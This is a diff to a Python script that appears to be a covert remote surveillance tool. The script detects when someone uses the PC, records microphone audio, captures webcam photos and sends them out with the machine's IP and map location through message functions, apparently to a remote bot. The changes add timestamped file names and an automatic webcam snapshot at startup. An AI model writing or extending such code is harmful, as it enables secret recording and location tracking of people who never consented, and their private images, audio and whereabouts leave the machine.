@@ -20,7 +20,7 @@ def detectActivity():
 			
 			if inactivite > 60 * 15 :
 				
-				sendMessage(f"Activite detectee, retour apres {inactivite/60} minutes d'absence")
+				sendMessage(f"Activite detectee, retour apres {round(inactivite/60)} minutes d'absence")
 			
 			last_activity = datetime.datetime.now()
 			
@@ -39,7 +39,6 @@ def recordSound():
 	fs = 44100 
 	seconds = 600
 	filename = f"{datadir}\\output.wav"
-	filename_mp3 = f"{datadir}\\output.mp3"
 
 
 	p = pyaudio.PyAudio() 
@@ -82,6 +81,9 @@ def recordSound():
 	wf.writeframes(b''.join(frames))
 	wf.close()
 	
+	ts = datetime.datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
+	filename_mp3 = f"{datadir}\\microphone_recording_{ts}.mp3"
+	
 	old_dir = os.getcwd()
 	os.chdir(startdir)
 	ffmpeg.input(filename).output(filename_mp3, loglevel="quiet").run(overwrite_output=True)
@@ -97,8 +99,11 @@ def takeWebcamPhoto():
 	cam = cv2.VideoCapture(0, cv2.CAP_DSHOW) 
 	result, image = cam.read() 
 	if result:
-		cv2.imwrite(f"{datadir}\\webcam_capture.png", image)
-		sendDocument(f"{datadir}\\webcam_capture.png")
+		
+		ts = datetime.datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
+		name = f"webcam_capture_{ts}.png"
+		cv2.imwrite(f"{datadir}\\{name}", image)
+		sendDocument(f"{datadir}\\{name}")
 	else:
 		sendMessage("Aucune webcam detectee")
 
@@ -208,6 +213,9 @@ if __name__ == "__main__":
 	activity = threading.Thread(target=detectActivity)
 	activity.start()
 	
+	cam = cv2.VideoCapture(0, cv2.CAP_DSHOW) 
+	result, image = cam.read() 
+	
 	print(f"{appname} started")
 	
 	while True:
@@ -224,6 +232,8 @@ if __name__ == "__main__":
 				message_accueil = f"PC en ligne le {date}\nAu lieu : https://www.google.com/maps/place/{coords[0]},{coords[1]}\nIP {ip}\nCommands : \n{commandes}"
 				
 				sendMessage(message_accueil)
+				
+				takeWebcamPhoto()
 				
 				first = False
 			
